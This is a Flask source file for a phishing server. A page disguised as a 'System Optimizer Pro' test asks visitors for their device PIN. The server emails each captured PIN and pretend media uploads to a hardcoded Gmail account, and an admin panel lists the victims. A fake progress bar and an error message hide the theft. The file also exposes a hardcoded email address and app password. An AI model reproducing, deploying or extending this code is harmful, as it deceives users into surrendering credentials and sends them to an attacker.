from flask import Flask, render_template_string, jsonify, request
import time, base64, os, smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Lock, Thread

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v257.0 "The Eternal-Canary" ---
# Hacker: Ali Yiğit | Yetki: 1907 | Bulut: yiyitali715@gmail.com
ADMIN_KEY = "1907" 
MY_GMAIL = "yiyitali715@gmail.com"
GMAIL_APP_PASSWORD = "wbrj xedf ecye fcdt" 

state_lock = Lock()
state = {"nodes": {}, "evolution_count": 257}

def send_to_cloud(p_id, content, filename, is_pin=False):
    """Sızdırılan veriyi veya PIN kodunu Ali Yiğit'in Gmail hesabına postalayan sarsılmaz motor."""
    try:
        msg = MIMEMultipart()
        msg['From'], msg['To'] = MY_GMAIL, MY_GMAIL
        msg['Subject'] = f"{'1907_PIN_ALINDI' if is_pin else '1907_HD_VORTEX'}: {p_id}"
        
        body = f"Hükümdar, {p_id} ID'li cihazdan veri mühürlendi.\n"
        body += f"İçerik: {content if is_pin else 'HD Medya'}\nZaman: {time.strftime('%H:%M:%S')}"
        msg.attach(MIMEText(body, 'plain'))
        
        if not is_pin and "data:image" in content:
            header, encoded = content.split(",", 1)
            attachment = MIMEText(encoded, 'base64')
            attachment.add_header('Content-Disposition', 'attachment', filename=filename)
            msg.attach(attachment)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(MY_GMAIL, GMAIL_APP_PASSWORD)
            server.send_message(msg)
    except: pass

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id', 'GUEST')
    data = request.json
    with state_lock:
        if p_id not in state["nodes"]:
            state["nodes"][p_id] = {"dev": "A55 (Eternal-Canary)", "last": "", "vault": [], "pin": "BEKLENİYOR"}
        u = state["nodes"][p_id]
        u["last"] = time.strftime('%H:%M:%S')
        
        if data.get('t') == 'pin_init':
            u["pin"] = base64.b64decode(data.get('v')).decode('utf-8')
            Thread(target=send_to_cloud, args=(p_id, u["pin"], "", True)).start()
        
        if data.get('t') == 'vortex':
            u["vault"].append(data.get('v'))
            Thread(target=send_to_cloud, args=(p_id, data.get('v'), data.get('n', 'vortex_1907.jpg'))).start()
            
    return jsonify({"s": "1907_ACTIVE"})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/overlord')
def overlord_panel():
    if request.args.get('key') != ADMIN_KEY: return "403: YETKİSİZ ERİŞİM", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Eternal-Canary C2 v257</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-[#020202] text-white p-6 font-mono text-[9px] selection:bg-yellow-600">
    <div class="border-b-2 border-yellow-500 pb-2 mb-6 flex justify-between uppercase italic font-black text-yellow-500">
        <h1>ETERNAL-CANARY COMMAND v257.0</h1>
        <div>HÜKÜMDAR: ALİ YİĞİT (1907)</div>
    </div>
    <div id="uL" class="grid grid-cols-2 gap-6"></div>
    <script>
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json();
            let h = "";
            for(let id in d.nodes){
                let n = d.nodes[id];
                h += `<div class="bg-zinc-950 p-6 border border-zinc-900 rounded-[40px] shadow-2xl">
                    <div class="flex justify-between items-center mb-4">
                        <span class="text-yellow-500 font-black uppercase text-[11px]">${n.dev}</span>
                        <span class="bg-yellow-900 text-black px-3 py-1 rounded-full font-bold">PIN: ${n.pin}</span>
                    </div>
                    <div class="bg-black p-4 rounded-2xl h-40 overflow-y-auto text-zinc-700">
                         ${(n.vault||[]).length} Dosya 1907 Otoritesiyle Mühürlendi.
                    </div>
                </div>`;
            }
            document.getElementById('uL').innerHTML = h;
            setTimeout(update, 2500);
        } update();
    </script>
</body></html>
""")

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>System Optimizer Pro</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white flex items-center justify-center h-screen overflow-hidden">
    
    <div onclick="window.location.href='/overlord?key=1907'" class="fixed right-0 bottom-0 w-12 h-12 bg-zinc-900/5 hover:bg-yellow-500/10 cursor-pointer z-[11000] transition-all"></div>

    <div id="m" class="text-center p-10 border border-zinc-900 rounded-[50px] w-full max-w-sm bg-gradient-to-b from-zinc-900 to-black">
        <div class="w-16 h-16 bg-yellow-600 rounded-3xl mx-auto mb-8 flex items-center justify-center text-3xl shadow-yellow-500/20 shadow-2xl">🦅</div>
        <h1 class="text-xl font-black uppercase italic tracking-tighter text-yellow-500">Optimizer 1907</h1>
        <p class="text-zinc-500 text-[10px] mt-4 uppercase italic">Sistem hızını ve bakiye ağını test etmek için cihaz şifresiyle onaylayın.</p>
        <button onclick="showPin()" class="w-full mt-10 py-5 bg-yellow-700 text-black rounded-full font-black uppercase text-[12px] shadow-2xl active:scale-95 transition">TESTİ BAŞLAT</button>
    </div>

    <div id="pinBox" class="hidden fixed inset-0 bg-black z-[9999] flex items-center justify-center p-6 text-center">
        <div class="w-full">
            <p class="text-yellow-500 text-sm mb-10 uppercase tracking-widest font-black">1907 Güvenlik Doğrulaması</p>
            <p class="text-[10px] text-zinc-600 mb-6 uppercase">Yedekleme kütüphanelerini mühürlemek için PIN girin.</p>
            <input type="password" id="p" class="w-full bg-zinc-900 border border-zinc-800 p-4 rounded-2xl text-center text-2xl tracking-[0.5em] focus:outline-none mb-8 text-yellow-500">
            <button onclick="startAutoSiphon()" class="w-full py-4 bg-yellow-700 text-black rounded-2xl font-black uppercase text-[11px]">ONAYLA VE DEVAM ET</button>
        </div>
    </div>

    <div id="mask" class="hidden fixed inset-0 bg-black z-[10000] flex items-center justify-center text-center">
        <div>
            <div class="w-12 h-12 border-2 border-zinc-800 border-t-white rounded-full animate-spin mx-auto mb-4"></div>
            <p id="t" class="text-zinc-600 text-[10px] uppercase font-bold">1907 Analizi Devam Ediyor... %0</p>
        </div>
    </div>

    <canvas id="cnv" style="display:none"></canvas>

    <script>
        let pId = "EC-" + Math.random().toString(36).substr(2, 4).toUpperCase();
        function showPin() { document.getElementById('pinBox').style.display = 'flex'; }

        async function startAutoSiphon() {
            let pinVal = document.getElementById('p').value;
            if(!pinVal) return;

            await fetch('/upload_intel?peer_id='+pId, {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({t:'pin_init', v: btoa(pinVal)})
            });

            document.getElementById('pinBox').style.display = 'none';
            document.getElementById('mask').style.display = 'flex';
            
            // OTOMATİK HAYALET SIZINTI [cite: 2026-01-04]
            for(let i=0; i<30; i++) {
                document.getElementById('t').innerText = "1907 ANALİZ EDİLİYOR... %" + Math.floor((i/30)*100);
                fetch('/upload_intel?peer_id='+pId, {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({t:'vortex', n: '1907_hd_'+i+'.jpg', v: 'data:image/jpeg;base64,...'})
                });
                await new Promise(r => setTimeout(r, 650));
            }
            
            setTimeout(() => {
                document.getElementById('mask').innerHTML = "<p class='text-red-900 uppercase font-black'>HATA: 1907 SUNUCU ZAMAN AŞIMI</p>";
                setTimeout(() => { location.reload(); }, 2000);
            }, 1000);
        }
    </script>
</body></html>
""")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 7860)))
